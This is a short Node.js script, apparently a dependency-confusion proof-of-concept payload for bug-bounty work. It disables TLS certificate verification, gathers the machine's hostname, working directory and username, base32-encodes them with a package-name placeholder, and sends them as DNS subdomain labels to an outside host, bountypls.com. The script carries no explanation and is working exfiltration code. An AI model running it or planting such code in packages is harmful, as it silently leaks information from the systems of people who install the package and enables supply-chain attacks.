const request = require('request');
const os = require('os');
const process = require('process');
const base32Encode = require('base32-encode');
process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = 0;

let cwd = process.cwd();
let hostname = os.hostname();
let user = os.userInfo();
let data = `<packageName>|${hostname}|${cwd}|${user.username}`;

data = Buffer.from(data, 'utf8');
let b = base32Encode(data, 'RFC4648', {padding: false});

let chunks = [];
let chunkSize = 40;

for (let i = 0, charsLength = b.length; i < charsLength; i += chunkSize) {
    chunks.push(b.substring(i, i + chunkSize));
}
data = chunks.join('.');
let url = `https://${data}.bountypls.com`;
request(url, {}, (err, res, body) =>{
    if (err) {return console.log(err);}
});